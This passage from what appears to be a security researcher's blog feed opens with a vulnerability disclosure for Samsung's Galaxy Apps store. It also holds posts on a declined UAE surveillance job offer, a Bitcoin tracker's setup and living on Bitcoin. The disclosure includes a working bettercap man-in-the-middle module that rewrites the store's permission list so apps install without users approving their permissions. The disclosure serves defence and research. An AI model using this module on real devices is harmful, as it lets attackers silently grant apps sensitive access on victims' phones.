<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="comment">=begin</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">BETTERCAP</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">Author : Simone 'evilsocket' Margaritelli</span></div><div class="line"><span class="comment">Email  : evilsocket<span class="doctag">@gmail</span>.com</span></div><div class="line"><span class="comment">Blog   : http://www.evilsocket.net/</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">This project is released under the GPL 3 license.</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">=end</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">GalaxyApps</span> &lt; BetterCap::Proxy::<span class="title">HTTP::Module</span></span></div><div class="line">  meta(</div><div class="line">    <span class="string">'Name'</span>        =&gt; <span class="string">'GalaxyApps'</span>,</div><div class="line">    <span class="string">'Description'</span> =&gt; <span class="string">'Bypass permission dialog for "Galaxy Apps" application on every Samsung device.'</span>,</div><div class="line">    <span class="string">'Version'</span>     =&gt; <span class="string">'1.0.0'</span>,</div><div class="line">    <span class="string">'Author'</span>      =&gt; <span class="string">"Simone 'evilsocket' Margaritelli"</span>,</div><div class="line">    <span class="string">'License'</span>     =&gt; <span class="string">'GPL3'</span></div><div class="line">  )</div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">def</span> <span class="title">on_request</span><span class="params">( request, response )</span></span></div><div class="line">    <span class="keyword">if</span> !request.body.<span class="literal">nil</span>? <span class="keyword">and</span> request.body.<span class="keyword">include</span>?(<span class="string">'&lt;SamsungProtocol'</span>)</div><div class="line">      req_name = <span class="string">'???'</span></div><div class="line">      <span class="keyword">if</span> request.body =~ <span class="regexp">/.+&lt;request\s+name="([^"]+)"/i</span></div><div class="line">        req_name = $1</div><div class="line">      <span class="keyword">end</span></div><div class="line"></div><div class="line">      BetterCap::Logger.info <span class="string">"[<span class="subst">#&#123;<span class="string">'GALAXY APPS'</span>.green&#125;</span>] Detected Galaxy Apps traffic: <span class="subst">#&#123;<span class="string">'request'</span>.blue&#125;</span>='<span class="subst">#&#123;req_name.yellow&#125;</span>'"</span></div><div class="line"></div><div class="line">      <span class="keyword">if</span> req_name == <span class="string">'androidManifestList'</span></div><div class="line">        response.body.gsub!( <span class="regexp">/permission"&gt;[^&lt;]+&lt;/i</span>, <span class="string">'permission"&gt;INTERNET&lt;'</span> )</div><div class="line">      <span class="keyword">end</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
<h4 id="Impact-1"><a href="#Impact-1" class="headerlink" title="Impact"></a>Impact</h4><p>An attacker could trick the user to think that an application which requires sensitive permissions does not require any at all, thus forcing the store to install it without any kind of user manual approval.</p>
<h4 id="Mitigations-amp-Recommendations"><a href="#Mitigations-amp-Recommendations" class="headerlink" title="Mitigations &amp; Recommendations"></a>Mitigations &amp; Recommendations</h4><ul>
<li>Use HTTPS connections for every API request.</li>
<li>Implement SSL key pinning to avoid SSL MITM attacks.</li>
<li>Double check the list of permissions after the application is downloaded reading them directly from its AndroidManifest.xml file.</li>
</ul>
<h4 id="Disclosure-Timeline"><a href="#Disclosure-Timeline" class="headerlink" title="Disclosure Timeline"></a>Disclosure Timeline</h4><ul>
<li>May 2 2016 : Initial disclosure.</li>
<li>June 7 2016 : Follow up.</li>
<li>June 8 2016 : Email from vendor working on fixes.</li>
<li>June 9 2016 : Confirmation that fixes were going to be pushed in next release</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart watches, is vulnerable to MITM attacks which could cause user information leaks, permissions dialog bypass and session hijacking.&lt;/p&gt;
&lt;h4 id=&quot;Affected-Products&quot;&gt;&lt;a href=&quot;#Affected-Products&quot; class=&quot;headerlink&quot; title=&quot;Affected Products&quot;&gt;&lt;/a&gt;Affected Products&lt;/h4&gt;&lt;p&gt;Samsung Galaxy Apps &amp;lt;= 4.1.01-14&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/images/2016/08/galaxyapps.png&quot; alt=&quot;galaxy apps&quot;&gt;&lt;br&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="mitm" scheme="https://www.evilsocket.net/tags/mitm/"/>
    
      <category term="man in the middle" scheme="https://www.evilsocket.net/tags/man-in-the-middle/"/>
    
      <category term="session hijacking" scheme="https://www.evilsocket.net/tags/session-hijacking/"/>
    
      <category term="permission bypass" scheme="https://www.evilsocket.net/tags/permission-bypass/"/>
    
      <category term="samsung" scheme="https://www.evilsocket.net/tags/samsung/"/>
    
      <category term="samsung galaxy apps" scheme="https://www.evilsocket.net/tags/samsung-galaxy-apps/"/>
    
      <category term="galaxy" scheme="https://www.evilsocket.net/tags/galaxy/"/>
    
  </entry>
  
  <entry>
    <title>How the United Arab Emirates Intelligence Tried to Hire Me to Spy on Its People</title>
    <link href="https://www.evilsocket.net/2016/07/27/How-The-United-Arab-Emirates-Intelligence-Tried-to-Hire-me-to-Spy-on-its-People/"/>
    <id>https://www.evilsocket.net/2016/07/27/How-The-United-Arab-Emirates-Intelligence-Tried-to-Hire-me-to-Spy-on-its-People/</id>
    <published>2016-07-27T21:02:13.000Z</published>
    <updated>2017-08-11T14:28:47.035Z</updated>
    
    <content type="html"><![CDATA[<p>Recently, we’ve been overwhelmed with news of horrors, attacks, monsters who murder the innocent in the name of a faith they don’t truly know. I’m publishing this article today to talk about other monsters, and I can guarantee these can be much worse than the ones we are now familiar with. They are the ones you don’t see coming, those you cannot conceive to be real.</p>
<p>Benjamin Franklin said:</p>
<pre><code>Either write something worth reading or do something worth writing.
</code></pre><p>Well, I’ll do my best.</p>
<a id="more"></a>
<h3 id="Free-as-in-Freedom"><a href="#Free-as-in-Freedom" class="headerlink" title="Free as in Freedom"></a>Free as in Freedom</h3><p>In the United Arab Emirates there is no such thing as freedom of speech; a fact that has been repeatedly confirmed by organisations such as Amnesty International and Human Rights Watch, the latter stating clearly that:</p>
<pre><code>The United Arab Emirates (UAE) often uses its affluence to mask the government’s serious human rights problems.
The government arbitrarily detains, and in some cases forcibly disappears, individuals who criticized the authorities,
and its security forces face allegations of torturing detaineeds. A new anti-discrimination law further jeopardizes
free speech and is discriminatory, as it excludes references to gender and sexuality. Authorities denied access to the
country to activists who criticized the UAE’s mistreatment of migrant workers.  Labor abuses persist, as migrant
construction workers facing serious exploitation. Female domestic workers are excluded from regulations that apply
to workers in other sectors.
</code></pre><center><small>Source: <a href="https://www.hrw.org/middle-east/n-africa/united-arab-emirates" target="_blank">Human Rights Watch</a></small></center>

<p>Instances of people being incarcerated for merely criticising their employers have been documented.</p>
<pre><code>In 2015, a man was detained for commenting on his employer&apos;s Facebook page after a disagreement with his employer,
even though the posts were made while the man was in the United States. Police in Abu Dhabi contacted him after he
came back to the UAE and asked him to meet officers at a police station, where he was later detained.
</code></pre><center><small>Source: <a href="http://www.bbc.com/news/technology-31692914" target="_blank">BBC</a></small></center>

<p>Needless to say that the Web is also subject to intensive scrutiny by the authorities, who block specific sites and services, and go as far as tracking private citizens.<br>In light of these facts, I feel obliged to divulge my own experience, what I was asked to do, and what is happening in the UAE of which many are oblivious.</p>
<p>I find it of utmost importance to speak up with the intent of informing the unknowing victims of their own government, as well as proving to these “gentlemen” that all the money in the world cannot buy a persons integrity.</p>
<p>Clearly I have no real evidence, if not a few, rather vague emails and a number of references I will link to in this article.<br>These people are as capable of invading the privacy of others as they are of protecting their own. It is up to my readers to form an opinion and decide whether my story holds any validity.</p>
<p>Though hardly news to anyone, nor particularly shocking, it is worth keeping in mind that it is usually the private companies that sell surveillance products to governments, whereas in this case we are looking at something developed internally by the government itself.</p>
<p>Moreover, in these lands the line between a “person of interest” and mere political dissident is truly very fine.</p>
<h3 id="Sounds-like-North-Korea"><a href="#Sounds-like-North-Korea" class="headerlink" title="Sounds like North Korea"></a>Sounds like North Korea</h3><p>My story begins on the 3rd of July 2016 when I was contacted for a job by an Italian citizen living in the UAE, known to be linked to <a href="http://www.verint.com/about/" target="_blank" rel="external">Verint Systems</a>: a large offensive security company of Israeli origins. Moreover, as absurd as it might sound, I was able to prove the involvement of a <a href="https://www.privatewave.com/" target="_blank" rel="external">PrivateWave</a> ex executive; a company that <strong>claims to be an ambassador of everyone’s security and privacy</strong>.</p>
<p>The initial exchange of emails were intentionally vague leaving much to the imagination, though the involvement of the Emirate Intelligence was evident. The following is an extract from one of the emails I received:</p>
<pre><code>Recently I was appointed a job, by an institutional client from an extra European country, to build a research and
development unit that will constitute their most advanced branch  of cybersecurity, to the exclusive benefit of the
national security.

As I previously mentioned, the aims are very ambitious in that we will have to develop a series of highly specific
and complex systems, among which are host-based softwares and network infrastructures (for which your work on
bettercap seems like an excellent background) as well as hardware when necessary for specific requirements (custom
network interfaces, systems that operate on radio-frequencies, as well as robots and drones for certain practical
applications)
</code></pre><p>Once phone numbers were exchanged, we spoke for the first time (on <strong>Signal</strong>, ironically) and I was given a few more details. I was finally able to gather that the Arab Emirates government is creating an elite task force to research and develop new large scale surveillance solutions. How large this scale was to be, I discovered only later.</p>
<p>Personally, I’m not entirely opposed to government interception if used selectively and for good reason. I am, however, against the exploitation of terms such as “internal security” and “terrorism”. Additionally, taking into account the nation in question, and what little I knew of its policies regarding dissidents, the entire affair began to seem extremely shady.</p>
<p>Nevertheless, the trip was already paid for, I needed a vacation, and was curious to get to the bottom of the matter. So I agreed to an initial meeting. On the 20th of July I boarded a plane for Dubai.</p>
<center><br><img src="/images/2016/07/marinaplaza.jpg" alt="marina plaza"><br></center>

<p>After the first day, spent talking on the twenty-ninth floor of the Marina Plaza, a building in the Dubai Marina area, things became much clearer… and more sinister.</p>
<p>First of all, the mastermind behind this “tiger team” is mr <strong>Faisal Al Bannai</strong>, former <a href="https://en.wikipedia.org/wiki/Axiom_Telecom" target="_blank" rel="external">mobile telephony tycoon</a> and current CEO of <a href="https://darkmatter.ae/en/about_us/#leadership_team" target="_blank" rel="external">DarkMatter</a>: a security company deeply rooted within the Emirates Intelligence. My Italian contact often referred to Al Bannai as the “Big Boss”. Though I never got to meet him, his involvement was made abundantly clear from the get-go.</p>
<center><br><img src="/images/2016/07/albannai.png" alt="al bannai"><br></center>

<p>What these delightful gentlemen are set out to achieve (as I previously mentioned, they aren’t <strong>selling</strong> the government a platform, <strong>they</strong> are the government) is a series of man in the middle and man on the side operations and technologies on a massive scale, with hardware probes capable of intercepting, modifying, and diverting (as well as occasionally obscuring) traffic on IP, 2G, 3G, and 4G networks.</p>
<p>Local Telco companies have already agreed and are ready to deploy these probes in public places, such as airports and malls.<br>When I asked my contact just how vast the range and distribution of the probes would be, e candidly replied:</p>
<pre><code>To operate as we want them to, these probes are going to be put everywhere.
</code></pre><p>Once the interception function will be finalised, a second team will be created to develop the more offensive component that will infect, trace, and ultimately take control of the devices within range: a range that will include all of Dubai and Abu Dhabi, given the use of drones, GSM cells, rogue APs, dedicated devices placed in the various nodes of local Telcos, and so on.<br>With the same smiling face, the person I spoke to went on to describe their end goal:</p>
<pre><code>Imagine that there&apos;s a person of interest at the Dubai Mall, we&apos;ve already set up all our probes all over the city, we press a button and BOOM! All the devices in the Mall are infected and traceable.
</code></pre><p><strong>In a country where criticising your employer, or worse, your government on Facebook is enough to land you behind bars, what exactly constitutes being a “person of interest”?</strong></p>
<p>And what kind of protection, if any, is afforded to those who visit the country for business purposes?</p>
<p>Clearly, I declined the job offer as was my initial intention, and to be honest, the last days I spent in Dubai where anxiety-riddled.  On the one hand, I wanted to get this information out in the open as quickly as possible, on the other, I knew I had to wait to leave the country to do it safely.</p>
<p>These people try to draw in young IT security talents by promising large sums of money (keeping in mind that there is no income tax in the UAE) various bonuses, apartments, and most of all, by presenting a professionally and intellectually stimulating environment. If by chance someone should raise an objection regarding potential targets and the somewhat questionable scope of the operation, they’d receive no more than a patronising lecture on how things have been blown out of proportion (yes, please do go and tell that to those poor bastards still sitting in prison) on how everything is relative and debatable, and the necessary compromises when it comes to national security; ironically, a rather US-like attitude from an Arab nation…</p>
<p>As far as I’m concerned, <strong>freedom of speech is indisputable</strong>; it isn’t a matter of “personal opinion” as someone pointed out to me when I voiced my doubts. It is a basic right that should be granted to anyone, regardless of geopolitical context, creed, or gender. Denying this right is <strong>fascism in its lowest form</strong>.</p>
<p>I hope this article will serve to warn those who, like me, might find themselves dragged into shady affairs, partially or completely unaware, as well as anyone pursuing job offers that entail moving to the UAE.  </p>
<p>Know that you would be giving up your privacy, and more importantly, your freedom of speech for money.</p>
<h3 id="One-Last-Thing"><a href="#One-Last-Thing" class="headerlink" title="One Last Thing"></a>One Last Thing</h3><p>Maybe this is just me, someone told me I’m exagerating the things in my mind … but as a matter of fact, this was published by the <strong>International Business Times</strong> July 27, which means today, which means two days after I left Dubai:</p>
<pre><code>If you get caught using a VPN in the UAE, you will face fines of up to $545,000
UAE has introduced a federal law banning the use of VPNs to try to avoid paying for expensive VOIP services.
</code></pre><p><a href="http://www.ibtimes.co.uk/if-you-get-caught-using-vpn-uae-you-will-face-fines-545000-1572888" target="_blank" rel="external">This is the article</a>, but maybe … yeah maybe it’s just me …</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Recently, we’ve been overwhelmed with news of horrors, attacks, monsters who murder the innocent in the name of a faith they don’t truly know. I’m publishing this article today to talk about other monsters, and I can guarantee these can be much worse than the ones we are now familiar with. They are the ones you don’t see coming, those you cannot conceive to be real.&lt;/p&gt;
&lt;p&gt;Benjamin Franklin said:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Either write something worth reading or do something worth writing.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Well, I’ll do my best.&lt;/p&gt;
    
    </summary>
    
    
      <category term="privacy" scheme="https://www.evilsocket.net/tags/privacy/"/>
    
      <category term="freedom" scheme="https://www.evilsocket.net/tags/freedom/"/>
    
      <category term="freedom of speech" scheme="https://www.evilsocket.net/tags/freedom-of-speech/"/>
    
      <category term="united arab emirates" scheme="https://www.evilsocket.net/tags/united-arab-emirates/"/>
    
      <category term="UAE" scheme="https://www.evilsocket.net/tags/UAE/"/>
    
      <category term="censorship" scheme="https://www.evilsocket.net/tags/censorship/"/>
    
      <category term="lawful interception" scheme="https://www.evilsocket.net/tags/lawful-interception/"/>
    
  </entry>
  
  <entry>
    <title>Presenting OpenBank, a Safe and Easy to Use BTC Tracker</title>
    <link href="https://www.evilsocket.net/2016/06/19/presenting-openbank-a-safe-and-easy-to-use-btc-tracker/"/>
    <id>https://www.evilsocket.net/2016/06/19/presenting-openbank-a-safe-and-easy-to-use-btc-tracker/</id>
    <published>2016-06-19T17:41:04.000Z</published>
    <updated>2017-08-11T14:28:47.043Z</updated>
    
    <content type="html"><![CDATA[<p>Are you a BitCoin user and do you happen to have many wallets and have a hard time to track their whole balance like me? If your answer is <code>yes</code> then you might find useful my latest project called <strong>OpenBank</strong>!</p>
<p>OpenBank is a Laravel and Angular based web application that you can use to keep track of your BitCoin public keys, your total balance and so forth. All the data is collected in realtime and will be shown to you on its web interface.</p>
<a id="more"></a>
<p>As a friend of mine wrote on another blog post, <code>a picture is worth a thousand words</code>, so here’s a screenshot.</p>
<p><img src="https://raw.githubusercontent.com/evilsocket/openbank/master/screenshot.png" alt="OpenBank"></p>
<p>You can find <a href="https://github.com/evilsocket/openbank" target="_blank" rel="external">OpenBank source code on github</a>.</p>
<h3 id="Completely-Safe"><a href="#Completely-Safe" class="headerlink" title="Completely Safe"></a>Completely Safe</h3><p>OpenBank is completely safe. Only your wallets public keys ( or XPUB keys if you happen to have hd wallets ) are stored on the database, therefore even if a malicious third party will succeed to hack into your system, he won’t get any sensitive data out of it.</p>
<p>If you don’t want your internet provider, hosting provider or dedicated server provider to be able to connect your ip address ( thus your identity ) to your public keys, just install OpenBank on your Raspberry Pi and run it on your own home network!</p>
<h3 id="How-does-it-work"><a href="#How-does-it-work" class="headerlink" title="How does it work?"></a>How does it work?</h3><p>Two cron jobs are responsible for updating the current BitCoin price ( either in EUR or USD, you can change your preferred currency in the settings panel ) and the balance of each of the public keys you registered into the system.</p>
<p>If you have an XPUB key with more than 50 addresses bound to it, you’ll need to get an API key from <a href="https://www.blockonomics.co/" target="_blank" rel="external">blockonomics</a> and put it in your settings panel.</p>
<h3 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h3><h5 id="1-Checkout-this-git-repository-to-your-server"><a href="#1-Checkout-this-git-repository-to-your-server" class="headerlink" title="1. Checkout this git repository to your server."></a>1. Checkout this git repository to your server.</h5><pre><code>git clone https://github.com/evilsocket/openbank.git
</code></pre><h5 id="2-Install-dependencies"><a href="#2-Install-dependencies" class="headerlink" title="2. Install dependencies."></a>2. Install dependencies.</h5><p>For details about installing composer see <a href="https://getcomposer.org/" target="_blank" rel="external">Getcomposer.org</a>.</p>
<pre><code>cd openbank
composer install
</code></pre><h5 id="3-Setup-environment"><a href="#3-Setup-environment" class="headerlink" title="3. Setup environment."></a>3. Setup environment.</h5><p>Copy <code>.env.example</code> to <code>.env</code> and edit to your needs.</p>
<h5 id="4-Fix-permissions"><a href="#4-Fix-permissions" class="headerlink" title="4. Fix permissions."></a>4. Fix permissions.</h5><p>Make sure the <code>storage</code> directory is writable for your web server.</p>
<h5 id="5-Initialize-database"><a href="#5-Initialize-database" class="headerlink" title="5. Initialize database."></a>5. Initialize database.</h5><pre><code>php artisan key:generate
php artisan migrate
php artisan db:seed --class=CurrenciesTableSeeder
</code></pre><h5 id="6-Create-the-cronjob"><a href="#6-Create-the-cronjob" class="headerlink" title="6. Create the cronjob"></a>6. Create the cronjob</h5><p>Install the needed cronjob:</p>
<pre><code>*/1 * * * * /usr/bin/php /var/www/openbank/www/artisan schedule:run
</code></pre><h5 id="7-Register"><a href="#7-Register" class="headerlink" title="7. Register."></a>7. Register.</h5><p>Open OpenBank in your browser, register your account and enjoy.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Are you a BitCoin user and do you happen to have many wallets and have a hard time to track their whole balance like me? If your answer is &lt;code&gt;yes&lt;/code&gt; then you might find useful my latest project called &lt;strong&gt;OpenBank&lt;/strong&gt;!&lt;/p&gt;
&lt;p&gt;OpenBank is a Laravel and Angular based web application that you can use to keep track of your BitCoin public keys, your total balance and so forth. All the data is collected in realtime and will be shown to you on its web interface.&lt;/p&gt;
    
    </summary>
    
    
      <category term="bitcoin" scheme="https://www.evilsocket.net/tags/bitcoin/"/>
    
      <category term="btc" scheme="https://www.evilsocket.net/tags/btc/"/>
    
      <category term="banks" scheme="https://www.evilsocket.net/tags/banks/"/>
    
      <category term="banking" scheme="https://www.evilsocket.net/tags/banking/"/>
    
      <category term="trezor" scheme="https://www.evilsocket.net/tags/trezor/"/>
    
      <category term="bank" scheme="https://www.evilsocket.net/tags/bank/"/>
    
      <category term="openbank" scheme="https://www.evilsocket.net/tags/openbank/"/>
    
      <category term="xpub" scheme="https://www.evilsocket.net/tags/xpub/"/>
    
      <category term="wallet" scheme="https://www.evilsocket.net/tags/wallet/"/>
    
  </entry>
  
  <entry>
    <title>Hacking Yourself Out of the Banking System and Live Only on BitCoin [EPISODE 2]</title>
    <link href="https://www.evilsocket.net/2016/05/30/Hacking-Yourself-out-of-the-Banking-System-and-Live-only-on-BitCoins-EPISODE-2/"/>
    <id>https://www.evilsocket.net/2016/05/30/Hacking-Yourself-out-of-the-Banking-System-and-Live-only-on-BitCoins-EPISODE-2/</id>
    <published>2016-05-30T15:43:43.000Z</published>
    <updated>2017-08-11T14:28:47.031Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/2016/05/btc.png" alt="btc"></p>
<p>Since my <a href="https://evilsocket.net/2016/05/08/Hacking-Yourself-out-of-the-Banking-System-and-Live-only-on-BitCoins/" target="_blank" rel="external">latest post about BitCoin</a> went viral it also got published on <a href="http://qz.com/689365/im-giving-up-traditional-banks-and-living-on-bitcoin-and-you-can-too/" target="_blank" rel="external">Quartz</a>, <a href="http://www.thememo.com/2016/05/24/ditching-bank-for-bitcoin-blockchain-banks-banking-simone-margaritelli/" target="_blank" rel="external">The Memo</a> and other various magazines.<br>Some people also asked me to keep writing about this and give them updates about my decision to ditch banks for BitCoin, so here I am :)</p>
<p>Unfortunately I’m still unable to fully avoid banks as I’m moving to another apartment and I need some money in my account, so at least for this month I had to get my wage sent to my main bank account, but within the next 1-2 months I’ll be able to move <strong>all</strong> of my assets to BTC.</p>
<p>In the meantime, here’re some clarifications about my previous post and some more insights/updates.</p>
<a id="more"></a>
<h3 id="My-Current-Setup"><a href="#My-Current-Setup" class="headerlink" title="My Current Setup"></a>My Current Setup</h3><p>After I tried different services I’ve finally decided my final setup, while this is not necessarly the best setup to use, chances are it’s definitely the most secure right now.</p>
<p><img src="/images/2016/05/btc_setup.png" alt="My BitCoin Setup"></p>
<p>As you can see, I configured my <a href="https://www.bitwage.com/referral/PSBJCGWMAR4O" target="_blank" rel="external">BitWage</a> account to receive the monthly paychecks from my employer ( I gave my employer the bank coordinates that BitWage provided me, he didn’t have to start using bitwage or any other platform rather than his usual banking system ) which are automatically converted to BTC and eventually sent directly to my Trezor hardware wallet.</p>
<p><img src="/images/2016/05/bitwage.png" alt="Wage being sent to my BTC address"></p>
<p>Once I have the BTC safely stored on my wallet, I move the quantity I need to spend (on a daily basis) on my <a href="https://cryptopay.me/join/b5728364" target="_blank" rel="external">CryptoPay</a> account and use the VISA debit card they sent me. During this month I was able to use the VISA to get some cash from a nearby ATM ( 99% of the world ATMs are enabled to use debit cards ), pay some restaurants, coffee, my Netflix subscription and so forth.</p>
<p><img src="/images/2016/05/visa.png" alt="My BTC VISA debit card linked to CryptoPay"></p>
<p>I also had the chance to buy Amazon gift cards directly in BTC using <a href="https://giftoff.com/affiliate/55af0d" target="_blank" rel="external">GiftOff.com</a>, it was fast, easy and secure :)</p>
<p><img src="/images/2016/05/giftoff.png" alt="GiftOff"></p>
<p>From time to time I might need to do bank transfers myself in order to pay bills and my rent, for such purpose I’m using <a href="https://bitwa.la/r/N3yjt9qeccjs4qCXc" target="_blank" rel="external">Bitwala</a> which has a very nice UI and it’s definitely easy to use, they will “transform” your BTC into either USD or EUR and perform a bank transfer for you.</p>
<p><img src="/images/2016/05/bitwala.png" alt="Bitwa.la Account"></p>
<h3 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h3><p>I know I already talked about these points, but <strong>security is vital</strong>, if you want to have all (or most) of your assets stored as BTC, you <strong>have</strong> to use the most secure tools and policies you can, otherwise you might lose everything (hackers, malwares, no backups, you name it).</p>
<ol>
<li>Never store all of your BTC online or on any wallet which is not a Trezor, only move the minimum amount you need every time.</li>
<li>Use a hardware wallet such as the Trezor.</li>
<li>Enable 2FA ( 2 Factory Authentication ) whenever you can.</li>
<li>Backup the recovery words of your hardware wallet in a safe, offline and possibly physical (online is not an option :D) place.</li>
</ol>
<h3 id="Managing-Price-Volatility"><a href="#Managing-Price-Volatility" class="headerlink" title="Managing Price Volatility"></a>Managing Price Volatility</h3><p>One thing I’ve been asked to clarify is how to manage price volatility, but what we exactly mean with “price volatility” anyway?<br>Long story short, when you <strong>buy</strong> bit coins ( either converting your salary or actively buying them on some exchange ), there’s a specific price which is determined by the market, let’s say you just bought X bit coins which are worth 1000$ (the price you paid for them).</p>
<p>That price might and <strong>will</strong> change in time, so let’s say that after a week the price decreased and your X bit coins are now worth 900$ … you just lost 100$.<br>The opposite might also happen of course, which would make you “earn” something if the price increases instead.</p>
<p>If you have bills to pay, you can’t afford this volatility … what if you have 1000$ of bills to pay but the value of the BTC you have just dropped down to 900$ ?</p>
<p>Keep in mind that having all your money in BTC is mostly a long term investment, but there’re a few ways to ensure that small amounts of your belongings do not change their value so fast.</p>
<p>For instance, if you know you have to pay 1000$ worth of bills, you might want to move all of them to your EUR/USD account on <a href="https://cryptopay.me/join/b5728364" target="_blank" rel="external">CryptoPay</a> ( or CoinBase or some exchange ) and keep them there until you spend them.<br>This way they are “frozen” as a fiat currency and they won’t lose any value.<br>There’re also services such as <a href="https://uphold.com/" target="_blank" rel="external">UpHold</a> that allow you to do that.</p>
<h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><p>In addition to the services that I mentioned, there’re a few other tools I use almost daily.</p>
<h5 id="Mycelium-Android-App"><a href="#Mycelium-Android-App" class="headerlink" title="Mycelium ( Android App )"></a>Mycelium ( Android App )</h5><p>If I need to pay for something while I’m not at home, I use the <a href="https://play.google.com/store/apps/details?id=com.mycelium.wallet" target="_blank" rel="external">Mycelium</a> wallet since it’s the only one which correctly interacts with my Trezor using an OTG cable, I do <strong>not</strong> store my BTC on my smartphone, I just use Mycelium as an interface to the Trezor.</p>
<div class="video-container"><iframe src="//www.youtube.com/embed/g5lwtqsMoAI" frameborder="0" allowfullscreen></iframe></div>
<h5 id="Bitcoinity-Price-Graphs"><a href="#Bitcoinity-Price-Graphs" class="headerlink" title="Bitcoinity ( Price Graphs )"></a>Bitcoinity ( Price Graphs )</h5><p>I constantly keep an eye on the BTC/EUR and BTC/USD prices, so I use <a href="http://bitcoinity.org/markets/coinbase/EUR" target="_blank" rel="external">BitCoinity</a> in order to track different markets/exchanges.</p>
<p><img src="/images/2016/05/bitcoinity.png" alt="Bitcoinity"></p>
<h5 id="r-bitcoin-Reddit-for-News-and-Info-about-BitCoin"><a href="#r-bitcoin-Reddit-for-News-and-Info-about-BitCoin" class="headerlink" title="/r/bitcoin ( Reddit for News and Info about BitCoin )"></a>/r/bitcoin ( Reddit for News and Info about BitCoin )</h5><p><a href="https://www.reddit.com/r/bitcoin" target="_blank" rel="external">/r/bitcoin</a> is definitely my preferred way of getting news and various information about what’s happening in the BitCoin world … if I see a significant price increase in some BTC market, Reddit is the first place I go searching for news, comments and suggestions.</p>
<p><img src="/images/2016/05/reddit.png" alt="BitCoin Reddit"></p>
<h3 id="Questions"><a href="#Questions" class="headerlink" title="Questions?"></a>Questions?</h3><p>This is all I’ve got for now, if you have questions or suggestions please feel free to leave a comment and I’ll try to give you an answer ( or integrate your suggestion ) in the next episode :)</p>
<p>If you have some spare BTC and wanna offer me a beer, this is my bitcoin account <code>3Gef69VY8HdhsPghdbipMrepMCKHWukXd3</code> :)</p>
<p><img src="/images/2016/05/account.png" alt="account"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/images/2016/05/btc.png&quot; alt=&quot;btc&quot;&gt;&lt;/p&gt;
&lt;p&gt;Since my &lt;a href=&quot;https://evilsocket.net/2016/05/08/Hacking-Yourself-out-of-the-Banking-System-and-Live-only-on-BitCoins/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;latest post about BitCoin&lt;/a&gt; went viral it also got published on &lt;a href=&quot;http://qz.com/689365/im-giving-up-traditional-banks-and-living-on-bitcoin-and-you-can-too/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Quartz&lt;/a&gt;, &lt;a href=&quot;http://www.thememo.com/2016/05/24/ditching-bank-for-bitcoin-blockchain-banks-banking-simone-margaritelli/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;The Memo&lt;/a&gt; and other various magazines.&lt;br&gt;Some people also asked me to keep writing about this and give them updates about my decision to ditch banks for BitCoin, so here I am :)&lt;/p&gt;
&lt;p&gt;Unfortunately I’m still unable to fully avoid banks as I’m moving to another apartment and I need some money in my account, so at least for this month I had to get my wage sent to my main bank account, but within the next 1-2 months I’ll be able to move &lt;strong&gt;all&lt;/strong&gt; of my assets to BTC.&lt;/p&gt;
&lt;p&gt;In the meantime, here’re some clarifications about my previous post and some more insights/updates.&lt;/p&gt;
    
    </summary>
    
    
      <category term="bitcoin" scheme="https://www.evilsocket.net/tags/bitcoin/"/>
    
      <category term="btc" scheme="https://www.evilsocket.net/tags/btc/"/>
    
      <category term="banks" scheme="https://www.evilsocket.net/tags/banks/"/>
    
      <category term="banking" scheme="https://www.evilsocket.net/tags/banking/"/>
    
      <category term="trezor" scheme="https://www.evilsocket.net/tags/trezor/"/>
    
  </entry>
  
  <entry>
    <title>Hacking Yourself Out of the Banking System and Live Only on BitCoin</title>
    <link href="https://www.evilsocket.net/2016/05/08/Hacking-Yourself-out-of-the-Banking-System-and-Live-only-on-BitCoins/"/>
    <id>https://www.evilsocket.net/2016/05/08/Hacking-Yourself-out-of-the-Banking-System-and-Live-only-on-BitCoins/</id>
    <published>2016-05-08T15:20:56.000Z</published>
    <updated>2017-08-11T14:28:47.031Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve been interested in BitCoin since the very beginning but, until now, I considered BTC some very nice cryptographic experiment with high potential but almost no effects on real life.<br>A few years ago, buying BTC or selling them in order to get fiat ( “real” currency such as USD, EUR, etc ) wasn’t easy at all, but now things changed and things are much easier.<br>That’s why I decided to live only with BitCoin and this is how I’m trying to do it.</p>
<p><img src="/images/2016/05/bitcoins.jpg" alt="bitcoin"></p>
